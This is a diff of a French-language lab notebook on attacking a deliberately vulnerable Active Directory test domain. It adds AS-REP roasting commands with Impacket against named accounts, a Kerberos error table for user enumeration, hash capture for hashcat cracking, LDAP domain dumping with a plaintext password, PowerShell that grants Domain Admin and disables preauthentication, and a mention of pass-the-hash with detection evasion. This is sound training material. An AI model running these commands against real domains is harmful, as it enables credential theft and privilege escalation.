@@ -18,7 +18,7 @@
 <br>
 
 > [!NOTE]
-> * Afin de rendre l'Active Directory vulnérable le script **BadBlood** est utilisé, il génère de nombreux groupe et utilisateurs avec de mauvaises permissions ainsi que des paramètres générant des failles exploitables comme c'est souvent le cas en entreprise.
+> * Afin de rendre l'Active Directory vulnérable le script **BadBlood** est utilisé, il génère de nombreux groupes et utilisateurs avec de mauvaises permissions ainsi que des paramètres générant des failles exploitables comme c'est souvent le cas en entreprise.
 > 
 > * ⚠️ Ne sourtout pas utiliser ce script sur un DC d'entreprise (dommages non réversibles).
 > 
@@ -55,6 +55,7 @@ sudo nmap -sV 10.0.0.1
 # __PING CASTLE__
 
 * Ping Castle permet de faire un état de santé général de l'Active Directory.
+* Cet outils est basé sur les critères de sécurités comme CIS Benchmarks, ANSSI
 * Il génère un rapport détallé en 4 blocs distincts.
 * [Lien vers le téléchargement de PingCastle](https://www.pingcastle.com/download/)
 
@@ -94,10 +95,15 @@ Vérifer les comptes qui ne nécéssitent pas de pré-authetification Kerberos
 Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
 ```
 
+Protocole Kerberos
+
+![](img/krbproto.png)
+
 
 
 
 <br>
+
 
 
 
@@ -122,14 +128,35 @@ Avec Impacket :
 ```sh
 impacket-GetNPUsers tssr-cyber.fr/ -no-pass -usersfile usr.txt
 ```
+
+| Code d’erreur Kerberos            | Statut de l’utilisateur                                   |
+|----------------------------------|------------------------------------------------------------|
+| KDC_ERR_C_PRINCIPAL_UNKNOWN      | Le nom d’utilisateur n’existe pas                          |
+| KDC_ERR_PREAUTH_REQUIRED         | Le nom d’utilisateur est valide et le compte est activé    |
+| KDC_ERR_CLIENT_REVOKED           | L’utilisateur existe, mais le compte est désactivé ou bloqué |
+| KDC_ERR_KEY_EXPIRED              | Password expiré, changé le pswd pur reset   |
+
+
 Cibler un seul compte
 ```sh
-impacket-GetNPUsers <domain-name>/<domain-user-name> -no-pass
+impacket-GetNPUsers TSSR-CYBER.FR/KATRINA_RUTLEDGE -no-pass
 ```
 ![img](img/krb5_ticket.png)
 
 
-## __Offline cracking__
+Ajouter le hash dans un fichier
+```sh
+printf '%s\n' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.txt 
+```
+
+
+
+<br>
+
+
+
+
+## __OFFLINE CRAKING__
 
 
 * Après avoir avoir récupéré un hash, le mettre dans un fichier et essayer de le craker avec hashcat ou JhonTheRipper
@@ -152,6 +179,38 @@ sudo hashcat -m 18200 -a 0 berniepatehash.txt /usr/share/wordlists/rockyou.txt -
 
 
 
+
+<br>
+
+
+
+
+## __DUMP AD__
+
+* ldapdomaindump
+  * Dumper les utilisateurs AD
+  * Dumper les groupes AD
+  * Dumper la Domain policy
+  * Dumper les computers AD
+  * Dumper les OS Version computers AD
+
+
+> [!NOTE]
+> Les résultats semblent similaires en dumpant avec un utilisateur standard 
+   
+Dumper l'AD et afficher le rapport utilisateur (`-o`va créer un dossier de destination)
+```sh
+ldapdomaindump -u 'TSSR-CYBER.FR\KATRINA_RUTLEDGE' -p Hacker1 10.0.0.1 -o LDAP-DUMP
+firefox domain_users.html  
+```
+
+![](img/dump.png)
+
+<br>
+
+Domain policy rapport
+
+![](img/dumpolicy.png)
 
 
 <br>
@@ -281,6 +340,31 @@ Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -
 Tranférer la liste du DC vers la Kali
 ```sh
 scp C:\Users\Administrateur\Desktop\domusers.txt totol@10.0.0.51:/home/toto/Bureau/
+```
+
+Afficher les groupes contenant la string "admin"
+```powershell
+Get-ADGroup -Filter 'Name -like "admin*"' | Select name
+```
+
+Ajouter un utilisateur dans le groupe admin du domaine
+```powershell
+Add-ADGroupMember -Identity "Admins du domaine" -Members "EDDIE_ROACH"
+```
+
+Ajouter du flag DONT_REQ_PREAUTH (attribut userAccountControl) désactive la préauth kerberos
+```powershell
+Set-ADUser EDDIE_ROACH -Replace @{userAccountControl = ( (Get-ADUser EDDIE_ROACH -Properties userAccountControl).userAccountControl -bor 0x400000 )}
+```
+
+Changer la password d'un utilisateur 
+```powershell
+Set-ADAccountPassword EDDIE_ROACH -Reset -NewPassword (ConvertTo-SecureString "Password123456" -AsPlainText -Force)
+```
+
+Récupérer son ticket kerberos
+```sh
+impacket-GetNPUsers TSSR-CYBER.FR/EDDIE_ROACH -no-pass
 ```
 
 Evilwinrm permet aussi de se conencter avec un hash NTLM (Pass-the-Hash) et de charger des scripts en mémoire pour éviter la détection.
